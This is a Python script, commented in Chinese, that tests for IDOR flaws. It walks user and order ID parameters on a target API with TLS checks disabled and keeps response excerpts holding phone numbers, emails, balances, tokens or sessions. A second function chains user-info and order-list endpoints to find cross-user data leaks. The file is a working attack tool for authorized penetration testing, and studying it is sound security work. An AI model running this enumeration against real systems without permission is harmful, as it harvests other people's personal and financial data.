"""
IDOR越权测试 - 测试参数遍历越权
输入: {target_url, param_name, test_ids, auth_token}
输出: {vulnerable: boolean, leaked_ids: [{id, data}], severity}
"""

import requests
import json
import re

requests.packages.urllib3.disable_warnings()


def idor_tester(config):
    """
    测试IDOR越权漏洞
    
    输入:
        target_url: string - 目标URL
        param_name: string - 参数名 (如 userId, orderNo)
        test_ids: string[] | number[] - 测试ID列表
        auth_token?: string - 认证token
    
    输出:
        vulnerable: boolean
        leaked_ids: Array<{id, data}>
        severity: "high" | "medium" | "low"
    """
    target_url = config.get('target_url')
    param_name = config.get('param_name', 'id')
    test_ids = config.get('test_ids', [1, 2, 3])
    auth_token = config.get('auth_token')
    
    headers = {}
    if auth_token:
        headers['Authorization'] = f'Bearer {auth_token}'
    
    leaked_ids = []
    different_responses = 0
    total_responses = 0
    
    baseline_response = None
    baseline_data = None
    
    for test_id in test_ids:
        # 构建测试URL
        if '?' in target_url:
            test_url = f"{target_url}&{param_name}={test_id}"
        else:
            test_url = f"{target_url}?{param_name}={test_id}"
        
        try:
            resp = requests.get(test_url, headers=headers, timeout=10, verify=False)
            total_responses += 1
            
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    data_str = json.dumps(data)
                    
                    # 保存第一个响应作为baseline
                    if baseline_response is None:
                        baseline_response = data_str
                        baseline_data = data
                    else:
                        # 比较响应是否不同
                        if data_str != baseline_response:
                            different_responses += 1
                            # 检查是否包含有效数据
                            if contains_business_data(data):
                                leaked_ids.append({
                                    'id': test_id,
                                    'data': data_str[:500],
                                    'size': len(data_str)
                                })
                except:
                    pass
                    
        except Exception as e:
            pass
    
    # 判断漏洞
    vulnerable = False
    severity = 'low'
    
    if len(leaked_ids) > 0:
        vulnerable = True
        severity = 'high'
    elif different_responses > 0 and total_responses > 1:
        # 有响应差异但没有泄露数据
        vulnerable = False
        severity = 'low'
    
    return {
        'vulnerable': vulnerable,
        'leaked_ids': leaked_ids,
        'severity': severity,
        'different_responses': different_responses,
        'total_responses': total_responses
    }


def contains_business_data(data):
    """判断是否包含业务数据"""
    if not isinstance(data, dict):
        return False
    
    # 检查是否有意义的业务字段
    business_fields = [
        'user', 'username', 'userId', 'user_id', 'name',
        'phone', 'email', 'mobile',
        'order', 'orderId', 'order_no',
        'balance', 'amount', 'money',
        'id', '_id',
        'token', 'session'
    ]
    
    data_str = json.dumps(data).lower()
    
    # 简单判断：包含多个业务字段
    match_count = sum(1 for f in business_fields if f.lower() in data_str)
    
    return match_count >= 2


def idor_chain_tester(config):
    """
    测试IDOR链 - 从用户ID到订单ID到退款
    
    输入:
        base_url: string
        user_ids: number[]
        order_ids?: number[]
    
    输出:
        chain_found: boolean
        chain_steps: Array<{endpoint, param, result}>
    """
    base_url = config.get('base_url')
    user_ids = config.get('user_ids', [1, 2])
    order_ids = config.get('order_ids', [1, 2])
    
    chain_steps = []
    
    # Step 1: 测试用户信息
    for uid in user_ids:
        url = f"{base_url}/api/user/info?userId={uid}"
        try:
            resp = requests.get(url, timeout=5, verify=False)
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if contains_business_data(data):
                        chain_steps.append({
                            'step': 1,
                            'endpoint': '/api/user/info',
                            'param': f'userId={uid}',
                            'result': 'leaked'
                        })
                except:
                    pass
        except:
            pass
    
    # Step 2: 测试订单列表
    for uid in user_ids:
        url = f"{base_url}/api/order/list?userId={uid}"
        try:
            resp = requests.get(url, timeout=5, verify=False)
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if isinstance(data, dict) and data.get('data'):
                        chain_steps.append({
                            'step': 2,
                            'endpoint': '/api/order/list',
                            'param': f'userId={uid}',
                            'result': 'leaked'
                        })
                except:
                    pass
        except:
            pass
    
    chain_found = len(chain_steps) > 0
    
    return {
        'chain_found': chain_found,
        'chain_steps': chain_steps
    }


if __name__ == '__main__':
    # 测试
    result = idor_tester({
        'target_url': 'http://example.com/api/user/info',
        'param_name': 'userId',
        'test_ids': [1, 2, 3]
    })
    print(f"Vulnerable: {result['vulnerable']}, Leaked: {len(result['leaked_ids'])}")
